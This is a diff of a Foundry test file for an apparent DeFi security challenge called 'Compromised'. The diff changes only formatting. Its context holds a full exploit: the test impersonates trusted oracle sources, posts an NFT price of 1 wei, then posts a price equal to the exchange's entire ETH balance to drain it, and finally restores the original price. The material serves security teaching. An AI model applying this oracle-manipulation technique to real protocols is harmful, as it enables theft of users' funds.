@@ -25,16 +25,14 @@ contract Compromised is Test {
         sources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;
         sources[2] = 0x81A5D6E50C214044bE44cA0CB057fe119097850c;
 
-        attacker = payable(
-            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
-        );
+        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
         vm.deal(attacker, 0.1 ether);
         vm.label(attacker, "Attacker");
         assertEq(attacker.balance, 0.1 ether);
 
         // Initialize balance of the trusted source addresses
         uint256 arrLen = sources.length;
-        for (uint8 i = 0; i < arrLen; ) {
+        for (uint8 i = 0; i < arrLen;) {
             vm.deal(sources[i], 2 ether);
             assertEq(sources[i].balance, 2 ether);
             unchecked {
@@ -43,7 +41,7 @@ contract Compromised is Test {
         }
 
         string[] memory symbols = new string[](3);
-        for (uint8 i = 0; i < arrLen; ) {
+        for (uint8 i = 0; i < arrLen;) {
             symbols[i] = "DVNFT";
             unchecked {
                 ++i;
@@ -51,7 +49,7 @@ contract Compromised is Test {
         }
 
         uint256[] memory initialPrices = new uint256[](3);
-        for (uint8 i = 0; i < arrLen; ) {
+        for (uint8 i = 0; i < arrLen;) {
             initialPrices[i] = INITIAL_NFT_PRICE;
             unchecked {
                 ++i;
@@ -75,7 +73,9 @@ contract Compromised is Test {
     }
 
     function testExploit() public {
-        /** EXPLOIT START **/
+        /**
+         * EXPLOIT START *
+         */
 
         address[] memory sources = new address[](2);
         sources[0] = 0xA73209FB1a42495120166736362A1DfA9F95A105;
@@ -87,9 +87,9 @@ contract Compromised is Test {
         symbols[2] = "DVNFT";
 
         //lower price of tokens to minimum value
-        for (uint256 j = 0; j < 2; ) {
+        for (uint256 j = 0; j < 2;) {
             vm.startPrank(sources[j]);
-            for (uint256 i = 0; i < 3; ) {
+            for (uint256 i = 0; i < 3;) {
                 trustfulOracle.postPrice(symbols[i], 1 wei);
                 unchecked {
                     ++i;
@@ -106,13 +106,10 @@ contract Compromised is Test {
         vm.stopPrank();
 
         //raise price of tokens to extract all exchange balance
-        for (uint256 j = 0; j < 2; ) {
+        for (uint256 j = 0; j < 2;) {
             vm.startPrank(sources[j]);
-            for (uint256 i = 0; i < 3; ) {
-                trustfulOracle.postPrice(
-                    symbols[i],
-                    EXCHANGE_INITIAL_ETH_BALANCE + 1 wei
-                );
+            for (uint256 i = 0; i < 3;) {
+                trustfulOracle.postPrice(symbols[i], EXCHANGE_INITIAL_ETH_BALANCE + 1 wei);
                 unchecked {
                     ++i;
                 }
@@ -129,9 +126,9 @@ contract Compromised is Test {
         vm.stopPrank();
 
         //fix token price
-        for (uint256 j = 0; j < 2; ) {
+        for (uint256 j = 0; j < 2;) {
             vm.startPrank(sources[j]);
-            for (uint256 i = 0; i < 3; ) {
+            for (uint256 i = 0; i < 3;) {
                 trustfulOracle.postPrice(symbols[i], INITIAL_NFT_PRICE);
                 unchecked {
                     ++i;
@@ -143,7 +140,9 @@ contract Compromised is Test {
             }
         }
 
-        /** EXPLOIT END **/
+        /**
+         * EXPLOIT END *
+         */
         validation();
     }
 
